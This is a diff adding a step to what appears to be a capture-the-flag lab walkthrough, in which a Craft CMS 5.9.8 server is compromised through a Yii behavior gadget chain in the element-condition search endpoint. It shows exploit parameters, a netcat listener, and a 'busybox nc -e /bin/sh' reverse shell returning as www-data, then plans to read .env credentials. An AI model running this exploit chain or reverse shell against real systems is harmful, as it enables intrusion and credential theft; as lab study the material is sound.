@@ -1155,7 +1155,73 @@ Craft lets CP users define "element conditions" (rules that filter elements like
 <br>
 </div>
 
+### 7.2 Trigger the RCE and catch a shell as www-data:
 
+**Why this step:** jenny has CP access on vulnerable Craft 5.9.8 (7.1). Submit the Yii behavior gadget through the element-condition sink to execute a reverse-shell command as the web user. The callback targets the pivot (`10.13.37.183`), since the portal cannot route to Kali.
+
+**Command:**
+
+```bash
+# On the pivot (airside-ws01): listener bound to its wlan2 address
+nc -lvnp 4444
+
+# On Kali: run the exploit over the ligolo tunnel
+python3 craft_rce.py
+```
+
+Exploit script (`craft_rce.py`, key parameters):
+
+```python
+BASE  = "http://portal.international.htb"
+USER  = "jenny"
+PASS  = "Fl1ghtDeck2026!"
+LHOST = "10.13.37.183"     # pivot wlan2 IP — listener lives here, NOT Kali
+LPORT = 4444
+# login -> fresh CP CSRF -> POST crafted condition to
+#   /index.php?p=admin/actions/element-search/search
+# gadget: "as rce" => yii\behaviors\AttributeTypecastBehavior
+#         typecast sink => Psy\Readline\Hoa\ConsoleProcessus::execute(cmd)
+#         "on *" => self::beforeSave  (fires on any event)
+# tries shells in order: busybox nc / ncat / nc / python3
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`nc -lvnp 4444` on the pivot|Catches the reverse shell at `10.13.37.183:4444`, the only listener address the portal can reach.|
+|login + fresh CP CSRF|Craft actions require a valid CSRF token; the script logs in as jenny and reads a current token from the CP.|
+|`"as rce": AttributeTypecastBehavior`|Attaches the abusable Yii behavior to the condition's field layout.|
+|typecast => `ConsoleProcessus::execute`|Points the behavior's typecast callable at a command-execution sink bundled with Craft's dependencies.|
+|`"on *": self::beforeSave`|Wildcard event handler so the behavior fires as soon as Craft evaluates the condition.|
+|POST to `element-search/search`|The reachable admin action that deserializes the attacker-controlled condition JSON.|
+|shell list (busybox/ncat/nc/python3)|Tries multiple one-liners; the first that connects hangs the HTTP request (a timeout = success).|
+
+**Result:**
+
+```
+# Kali:
+[+] logged in as jenny
+[+] timeout (shell probably running): busybox nc 10.13.37.183 4444 -e /bin/sh
+[*] check your listener on the pivot host
+
+# Pivot listener:
+Connection received on 10.13.37.10 54246
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+hostname
+portal
+```
+
+**What this gives you:**
+
+Key findings:
+
+- Remote code execution achieved as `www-data` on host `portal` (`10.13.37.10`), the internal Craft server.
+- The reverse shell correctly returned to the pivot (`10.13.37.183`), confirming the internal-callback requirement; the `busybox nc -e` payload succeeded first.
+- A request timeout on the Kali side is the expected success indicator (the PHP worker blocks while running the shell).
+
+**Next:** From the www-data shell, read Craft's `.env` for the security key and database credentials, then locate where the custom Miles module stores the encrypted mail-relay password.
 <div align="center">
 <br>
 <br>
